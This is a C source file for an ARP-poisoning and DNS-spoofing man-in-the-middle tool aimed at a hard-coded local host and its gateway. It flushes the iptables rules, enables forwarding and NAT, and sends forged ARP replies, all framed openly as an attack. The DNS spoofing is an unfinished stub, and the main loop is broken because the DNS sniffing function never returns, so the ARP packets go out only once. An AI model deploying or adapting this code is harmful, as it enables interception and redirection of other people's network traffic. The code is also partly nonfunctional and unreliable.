#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <pcap.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>

// Configuration
#define INTERFACE "enp0s3"
#define TARGET_IP "192.168.1.100"
#define GATEWAY_IP "192.168.1.1"
#define SPOOF_DOMAIN "www.example.com"
#define FAKE_IP "1.2.3.4"

int ip_forwarding = 1;
pcap_t *handle;
int arp_socket;
int dns_socket;

// Enable IP forwarding
void enable_ip_forwarding() {
    system("sudo sysctl -w net.ipv4.ip_forward=1");
    system("sudo iptables --flush");
    system("sudo iptables --table nat --flush");
    system("sudo iptables --delete-chain");
    system("sudo iptables --table nat --delete-chain");
    system("sudo iptables -P FORWARD ACCEPT");
    system("sudo iptables -t nat -A POSTROUTING -o " INTERFACE " -j MASQUERADE");
    printf("[+] IP forwarding enabled\n");
}

// ARP packet structure
struct arp_packet {
    u_int16_t htype;
    u_int16_t ptype;
    u_char hlen;
    u_char plen;
    u_int16_t oper;
    u_char sha[6];
    u_char spa[4];
    u_char tha[6];
    u_char tpa[4];
};

// Send ARP spoof packet
void send_arp_spoof(int sock, const char *src_ip, const char *dst_ip, const char *target_ip) {
    struct sockaddr_ll sa;
    struct arp_packet arp;
    unsigned char buffer[60] = {0};
    unsigned char src_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55}; // Your MAC
    
    // Ethernet header
    memset(buffer, 0xff, 6); // Broadcast MAC
    memcpy(buffer + 6, src_mac, 6); // Source MAC
    *(unsigned short *)(buffer + 12) = htons(0x0806); // ARP type
    
    // ARP header
    arp.htype = htons(1); // Ethernet
    arp.ptype = htons(0x0800); // IP
    arp.hlen = 6;
    arp.plen = 4;
    arp.oper = htons(2); // ARP reply
    
    memcpy(arp.sha, src_mac, 6);
    inet_pton(AF_INET, src_ip, arp.spa);
    memset(arp.tha, 0, 6); // Target MAC (unknown)
    inet_pton(AF_INET, target_ip, arp.tpa);
    
    memcpy(buffer + 14, &arp, sizeof(arp));
    
    // Send packet
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_nametoindex(INTERFACE);
    sa.sll_halen = 6;
    memcpy(sa.sll_addr, src_mac, 6);
    
    sendto(sock, buffer, 42, 0, (struct sockaddr *)&sa, sizeof(sa));
}

// DNS spoofing
void dns_spoof(pcap_t *handle, const char *domain, const char *fake_ip) {
    struct pcap_pkthdr header;
    const u_char *packet;
    
    while (1) {
        packet = pcap_next(handle, &header);
        if (packet == NULL) continue;
        
        // Check for DNS packets (simplified)
        struct iphdr *ip = (struct iphdr *)(packet + 14);
        if (ip->protocol == 17) { // UDP
            struct udphdr *udp = (struct udphdr *)(packet + 14 + (ip->ihl * 4));
            if (ntohs(udp->dest) == 53) { // DNS port
                printf("[*] DNS request detected\n");
                // Here you would parse and spoof the DNS response
            }
        }
    }
}

// Cleanup
void cleanup() {
    printf("\n[*] Cleaning up...\n");
    system("sudo sysctl -w net.ipv4.ip_forward=0");
    system("sudo iptables --flush");
    system("sudo iptables --table nat --flush");
    close(arp_socket);
    close(dns_socket);
    pcap_close(handle);
    printf("[+] Cleanup complete\n");
    exit(0);
}

// Signal handler
void sigint_handler(int sig) {
    cleanup();
}

int main() {
    signal(SIGINT, sigint_handler);
    
    // Enable IP forwarding
    enable_ip_forwarding();
    
    // Create raw socket for ARP spoofing
    arp_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (arp_socket < 0) {
        perror("ARP socket");
        exit(1);
    }
    
    // Open interface for DNS spoofing
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", INTERFACE, errbuf);
        exit(1);
    }
    
    printf("[+] MITM attack running. Press Ctrl+C to stop...\n");
    
    // Main attack loop
    while (1) {
        // Send ARP spoof packets
        send_arp_spoof(arp_socket, GATEWAY_IP, TARGET_IP, TARGET_IP);
        send_arp_spoof(arp_socket, TARGET_IP, GATEWAY_IP, GATEWAY_IP);
        
        // Check for DNS packets
        dns_spoof(handle, SPOOF_DOMAIN, FAKE_IP);
        
        sleep(2);
    }
    
    return 0;
}